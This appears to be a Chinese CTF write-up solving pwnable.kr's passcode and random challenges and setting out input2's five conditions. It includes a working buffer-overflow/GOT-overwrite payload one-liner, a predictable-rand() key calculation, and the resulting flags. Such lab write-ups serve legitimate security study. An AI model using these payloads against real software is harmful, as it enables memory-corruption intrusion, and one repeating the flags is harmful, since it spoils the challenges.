借助 Python 向程序传参，得到 flag 信息。
passcode@ubuntu:~$ python2 -c &#x27;print &quot;a&quot; * 96 + &quot;\x14\xc0\x04\x08&quot; + &quot;134517409&quot;&#x27; | ./passcodeToddler&#x27;s Secure Login System 1.1 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!s0rry_mom_I_just_ign0red_c0mp1ler_w4rningenter passcode1 : Now I can safely trust you that you have credential :)

random查看程序源码，当输入数据与随机数异或结果为 0xcafebabe 时，得到 flag 信息。
#include &lt;stdio.h&gt;int main()&#123;	unsigned int random;	random = rand();	// random value!	unsigned int key=0;	scanf(&quot;%d&quot;, &amp;key);	if( (key ^ random) == 0xcafebabe )&#123;		printf(&quot;Good!\n&quot;);		setregid(getegid(), getegid());		system(&quot;/bin/cat flag&quot;);		return 0;	&#125;	printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);	return 0;&#125;

由于程序在调用 rand() 函数之前，未调用 srand() 函数初始化随机数种子，因此系统会默认以 1 为种子生成随机数，这将导致每次运行程序生成的随机数均相同。
本地调试程序，得到生成的随机数 0x6b8b4567。
*RAX  0x6b8b4567   0x555555555216 &lt;main+13&gt;    mov    rax, qword ptr fs:[0x28]   0x55555555521f &lt;main+22&gt;    mov    qword ptr [rbp - 0x18], rax   0x555555555223 &lt;main+26&gt;    xor    eax, eax   0x555555555225 &lt;main+28&gt;    mov    eax, 0   0x55555555522a &lt;main+33&gt;    call   rand@plt                    &lt;rand@plt&gt;  ► 0x55555555522f &lt;main+38&gt;    mov    dword ptr [rbp - 0x1c], eax

异或计算得到正确的 key 值为 0xa175ffd9，即十进制 2708864985。
运行程序，得到 flag 信息。
random@ubuntu:~$ ./random2708864985Good!m0mmy_I_can_predict_rand0m_v4lue!

input2查看程序源码，需要满足五个条件才能得到 flag 信息。
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123;	printf(&quot;Welcome to pwnable.kr\n&quot;);	printf(&quot;Let&#x27;s see if you know how to give input to program\n&quot;);	printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);	// argv	if(argc != 100) return 0;	if(strcmp(argv[&#x27;A&#x27;],&quot;\x00&quot;)) return 0;	if(strcmp(argv[&#x27;B&#x27;],&quot;\x20\x0a\x0d&quot;)) return 0;	printf(&quot;Stage 1 clear!\n&quot;);		// stdio	char buf[4];	read(0, buf, 4);	if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;	read(2, buf, 4);        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;	printf(&quot;Stage 2 clear!\n&quot;);		// env	if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;	printf(&quot;Stage 3 clear!\n&quot;);	// file	FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);	if(!fp) return 0;	if( fread(buf, 4, 1, fp)!=1 ) return 0;	if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;	fclose(fp);	printf(&quot;Stage 4 clear!\n&quot;);		// network	int sd, cd;	struct sockaddr_in saddr, caddr;	sd = socket(AF_INET, SOCK_STREAM, 0);	if(sd == -1)&#123;		printf(&quot;socket error, tell admin\n&quot;);		return 0;	&#125;	saddr.sin_family = AF_INET;	saddr.sin_addr.s_addr = INADDR_ANY;	saddr.sin_port = htons( atoi(argv[&#x27;C&#x27;]) );	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;		printf(&quot;bind error, use another port\n&quot;);    		return 1;	&#125;	listen(sd, 1);	int c = sizeof(struct sockaddr_in);	cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);	if(cd &lt; 0)&#123;		printf(&quot;accept error, tell admin\n&quot;);		return 0;	&#125;	if( recv(cd, buf, 4, 0) != 4 ) return 0;	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;	printf(&quot;Stage 5 clear!\n&quot;);	// here&#x27;s your flag	setregid(getegid(), getegid());	system(&quot;/bin/cat flag&quot;);		return 0;&#125;

第一个条件，通过 Shell 传递 100 个参数，且第 A (65) 个参数为 \x00，第 B (66) 个参数为 \x20\x0a\x0d。
// argvif(argc != 100) return 0;if(strcmp(argv[&#x27;A&#x27;],&quot;\x00&quot;)) return 0;if(strcmp(argv[&#x27;B&#x27;],&quot;\x20\x0a\x0d&quot;)) return 0;printf(&quot;Stage 1 clear!\n&quot;);	

第二个条件，向 stdio 中写入 \x00\x0a\x00\xff，向 stderr 中写入 \x00\x0a\x02\xff。
// stdiochar buf[4];read(0, buf, 4);if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;read(2, buf, 4);       if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;printf(&quot;Stage 2 clear!\n&quot;);

第三个条件，新增 \xde\xad\xbe\xef 环境变量，设置值为 \xca\xfe\xba\xbe。
// envif(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;printf(&quot;Stage 3 clear!\n&quot;);

第四个条件，新建 \x0a 文件，内容为 \x00\x00\x00\x00。
// fileFILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);if(!fp) return 0;if( fread(buf, 4, 1, fp)!=1 ) return 0;if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;fclose(fp);printf(&quot;Stage 4 clear!\n&quot;);	

第五个条件，通过 Shell 第 C (67) 个参数指定监听端口，建立连接发送 \xde\xad\xbe\xef 数据。
// networkint sd, cd;struct sockaddr_in saddr, caddr;sd = socket(AF_INET, SOCK_STREAM, 0);if(sd == -1)&#123;	printf(&quot;socket error, tell admin\n&quot;);	return 0;&#125;saddr.sin_family = AF_INET;saddr.sin_addr.s_addr = INADDR_ANY;saddr.sin_port = htons( atoi(argv[&#x27;C&#x27;]) );if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;	printf(&quot;bind error, use another port\n&quot;);   		return 1;&#125;listen(sd, 1);int c = sizeof(struct sockaddr_in);cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);if(cd &lt; 0)&#123;	printf(&quot;accept error, tell admin\n&quot;);	return 0;&#125;if( recv(cd, buf, 4, 0) != 4 ) return 0;if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;printf(&quot;Stage 5 clear!\n&quot;);

